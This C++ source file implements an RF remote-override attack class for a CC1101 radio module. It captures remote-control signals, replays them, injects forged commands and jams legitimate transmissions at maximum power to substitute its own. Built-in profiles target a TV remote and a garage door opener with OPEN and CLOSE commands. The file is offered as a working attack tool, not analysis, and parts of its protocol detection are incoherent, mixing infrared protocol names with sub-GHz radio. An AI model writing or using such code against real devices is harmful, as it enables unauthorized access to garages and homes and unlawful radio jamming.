#include "RFRemoteOverrideAttack.h"

RFRemoteOverrideAttack::RFRemoteOverrideAttack()
{
    signalProcessor = new RFSignalProcessor();
    currentDevice = nullptr;
    captureMode = false;
}

RFRemoteOverrideAttack::~RFRemoteOverrideAttack()
{
    delete signalProcessor;
}

bool RFRemoteOverrideAttack::init(const Config &config)
{
    this->config = config;

    // Initialize CC1101 with remote control specific settings
    ELECHOUSE_CC1101.Init();
    ELECHOUSE_CC1101.setModulation(config.modulation);
    ELECHOUSE_CC1101.setMHZ(config.frequency);
    ELECHOUSE_CC1101.SetRx();

    // Load known device profiles
    loadKnownProfiles();

    return true;
}

bool RFRemoteOverrideAttack::startCapture()
{
    if (captureMode)
    {
        return false;
    }

    captureMode = true;
    return signalProcessor->startListening(config.frequency);
}

bool RFRemoteOverrideAttack::stopCapture()
{
    if (!captureMode)
    {
        return false;
    }

    captureMode = false;
    signalProcessor->stopListening();
    return true;
}

CaptureResult RFRemoteOverrideAttack::learnCommand()
{
    CaptureResult result = {false};

    if (!captureMode)
    {
        return result;
    }

    std::vector<uint8_t> signal;
    if (!signalProcessor->captureSignal(signal))
    {
        return result;
    }

    // Analyze the captured signal
    if (!analyzeCommandPattern(signal))
    {
        return result;
    }

    // Detect protocol
    std::string protocol;
    if (detectProtocol(signal))
    {
        result.detectedProtocol = protocol;
    }

    // Create command from captured signal
    Command cmd;
    cmd.pattern = signal;
    cmd.duration = signalProcessor->getLastSignalDuration();
    cmd.repeatCount = 1;
    cmd.description = "Learned command at " + String(millis()).c_str();

    result.success = true;
    result.capturedCommand = cmd;
    result.signalQuality = signalProcessor->getLastSignalStrength();

    lastCapturedCommand = cmd;

    return result;
}

bool RFRemoteOverrideAttack::analyzeCommandPattern(const std::vector<uint8_t> &signal)
{
    if (signal.empty())
    {
        return false;
    }

    // Look for common remote control patterns
    std::string matchedDevice;
    if (matchKnownPattern(signal, matchedDevice))
    {
        // Found matching device pattern
        for (auto &device : knownDevices)
        {
            if (device.deviceType == matchedDevice)
            {
                currentDevice = &device;
                break;
            }
        }
    }

    return true;
}

bool RFRemoteOverrideAttack::detectProtocol(const std::vector<uint8_t> &signal)
{
    // Common protocols to check
    const std::vector<std::string> protocols = {
        "NEC", "RC5", "RC6", "SAMSUNG", "SONY"};

    for (const auto &protocol : protocols)
    {
        if (isValidProtocol(protocol))
        {
            // Check protocol-specific patterns
            switch (signal[0])
            {
            case 0xA0: // NEC protocol header
                return protocol == "NEC";
            case 0xC0: // RC5 protocol header
                return protocol == "RC5";
            case 0xE0: // RC6 protocol header
                return protocol == "RC6";
            default:
                break;
            }
        }
    }

    return false;
}

void RFRemoteOverrideAttack::addDeviceProfile(const DeviceProfile &profile)
{
    knownDevices.push_back(profile);
}

bool RFRemoteOverrideAttack::selectDevice(const std::string &deviceType)
{
    for (auto &device : knownDevices)
    {
        if (device.deviceType == deviceType)
        {
            currentDevice = &device;

            // Configure radio for this device
            ELECHOUSE_CC1101.setMHZ(device.frequency / 1000000.0);
            ELECHOUSE_CC1101.setModulation(device.modulation);

            return true;
        }
    }
    return false;
}

bool RFRemoteOverrideAttack::loadKnownProfiles()
{
    // Add some common device profiles
    DeviceProfile tv = {
        "TV_REMOTE",
        433920000,    // 433.92MHz
        2,            // FSK
        {0xAA, 0xAA}, // Sync word
        {
            {"POWER", {{0xA0, 0x01}, 100, 3, "Power toggle"}},
            {"VOLUME_UP", {{0xA0, 0x02}, 100, 2, "Volume increase"}},
            {"VOLUME_DOWN", {{0xA0, 0x03}, 100, 2, "Volume decrease"}}}};
    addDeviceProfile(tv);

    DeviceProfile garage = {
        "GARAGE_DOOR",
        315000000,    // 315MHz
        2,            // FSK
        {0x55, 0x55}, // Sync word
        {
            {"OPEN", {{0xB0, 0x01}, 150, 4, "Open door"}},
            {"CLOSE", {{0xB0, 0x02}, 150, 4, "Close door"}},
            {"STOP", {{0xB0, 0x03}, 150, 4, "Stop door"}}}};
    addDeviceProfile(garage);

    return true;
}

bool RFRemoteOverrideAttack::injectCommand(const Command &cmd)
{
    if (!validateCommand(cmd))
    {
        return false;
    }

    optimizeTransmission();
    return transmitCommand(cmd);
}

bool RFRemoteOverrideAttack::injectSequence(const std::vector<Command> &sequence)
{
    bool success = true;
    for (const auto &cmd : sequence)
    {
        if (!injectCommand(cmd))
        {
            success = false;
            break;
        }
        delay(50); // Small delay between commands
    }
    return success;
}

bool RFRemoteOverrideAttack::overrideCommand(const Command &original, const Command &replacement)
{
    // Start jamming the original command frequency
    ELECHOUSE_CC1101.SetTx();
    delay(10); // Brief jamming period

    // Quickly switch to sending replacement command
    bool success = injectCommand(replacement);

    ELECHOUSE_CC1101.SetRx();
    return success;
}

bool RFRemoteOverrideAttack::startCommandTakeover()
{
    if (!captureMode)
    {
        return false;
    }

    // Start monitoring for commands
    while (captureMode)
    {
        CaptureResult result = learnCommand();
        if (result.success)
        {
            // Immediately override with our command
            Command takeoverCmd = result.capturedCommand;
            takeoverCmd.pattern[0] ^= 0xFF; // Invert command bits
            return overrideCommand(result.capturedCommand, takeoverCmd);
        }
        delay(10);
    }

    return false;
}

bool RFRemoteOverrideAttack::jamAndReplace(const Command &replacement)
{
    // Start jamming
    ELECHOUSE_CC1101.SetTx();
    ELECHOUSE_CC1101.setPa(12); // Maximum power for jamming

    // Send jamming signal for a short duration
    uint8_t jamSignal[] = {0xFF, 0xFF, 0xFF, 0xFF};
    ELECHOUSE_CC1101.SendData(jamSignal, sizeof(jamSignal));

    // Quick switch to replacement command
    bool success = injectCommand(replacement);

    ELECHOUSE_CC1101.SetRx();
    return success;
}

bool RFRemoteOverrideAttack::replayLastCommand()
{
    if (lastCapturedCommand.pattern.empty())
    {
        return false;
    }

    return injectCommand(lastCapturedCommand);
}

bool RFRemoteOverrideAttack::generateCustomCommand(
    const std::string &template_name,
    const std::map<std::string, std::string> &params)
{
    if (!currentDevice)
    {
        return false;
    }

    Command customCmd;
    customCmd.pattern = {0xA0}; // Start with header

    // Add parameter-based modifications
    for (const auto &param : params)
    {
        if (param.first == "function")
        {
            customCmd.pattern.push_back(std::stoi(param.second));
        }
        else if (param.first == "repeat")
        {
            customCmd.repeatCount = std::stoi(param.second);
        }
    }

    // Add checksum
    uint32_t checksum = calculateChecksum(customCmd.pattern);
    customCmd.pattern.push_back(checksum & 0xFF);

    return injectCommand(customCmd);
}

bool RFRemoteOverrideAttack::validateCommand(const Command &cmd)
{
    if (cmd.pattern.empty() || cmd.pattern.size() > 64)
    {
        return false;
    }

    if (cmd.duration == 0 || cmd.duration > 1000)
    {
        return false;
    }

    return true;
}

bool RFRemoteOverrideAttack::transmitCommand(const Command &cmd)
{
    ELECHOUSE_CC1101.SetTx();

    bool success = true;
    for (uint32_t i = 0; i < cmd.repeatCount; i++)
    {
        if (!ELECHOUSE_CC1101.SendData(cmd.pattern.data(), cmd.pattern.size()))
        {
            success = false;
            break;
        }
        if (i < cmd.repeatCount - 1)
        {
            delayMicroseconds(cmd.duration);
        }
    }

    ELECHOUSE_CC1101.SetRx();
    return success;
}

uint32_t RFRemoteOverrideAttack::calculateChecksum(const std::vector<uint8_t> &data)
{
    uint32_t sum = 0;
    for (uint8_t byte : data)
    {
        sum += byte;
    }
    return sum & 0xFF;
}

void RFRemoteOverrideAttack::optimizeTransmission()
{
    // Adjust power based on required range
    ELECHOUSE_CC1101.setPa(8); // Medium power for normal operation

    // Set optimal data rate
    if (config.bitRate > 0)
    {
        ELECHOUSE_CC1101.setDRate(config.bitRate);
    }
}

bool RFRemoteOverrideAttack::matchKnownPattern(
    const std::vector<uint8_t> &signal,
    std::string &matchedDevice)
{
    for (const auto &device : knownDevices)
    {
        if (signal.size() >= device.syncWord.size())
        {
            bool match = true;
            for (size_t i = 0; i < device.syncWord.size(); i++)
            {
                if (signal[i] != device.syncWord[i])
                {
                    match = false;
                    break;
                }
            }
            if (match)
            {
                matchedDevice = device.deviceType;
                return true;
            }
        }
    }
    return false;
}

void RFRemoteOverrideAttack::buildCommandDatabase()
{
    // This would typically load from a file or EEPROM
    // For now, we'll just add some common commands
    if (currentDevice)
    {
        Command powerCmd = {{0xA0, 0x01}, 100, 3, "Power"};
        currentDevice->commands["POWER"] = powerCmd;

        Command volumeUpCmd = {{0xA0, 0x02}, 100, 2, "Volume Up"};
        currentDevice->commands["VOLUME_UP"] = volumeUpCmd;

        Command volumeDownCmd = {{0xA0, 0x03}, 100, 2, "Volume Down"};
        currentDevice->commands["VOLUME_DOWN"] = volumeDownCmd;
    }
}

bool RFRemoteOverrideAttack::isValidProtocol(const std::string &protocol)
{
    const std::vector<std::string> validProtocols = {
        "NEC", "RC5", "RC6", "SAMSUNG", "SONY"};

    return std::find(validProtocols.begin(), validProtocols.end(), protocol) != validProtocols.end();
}
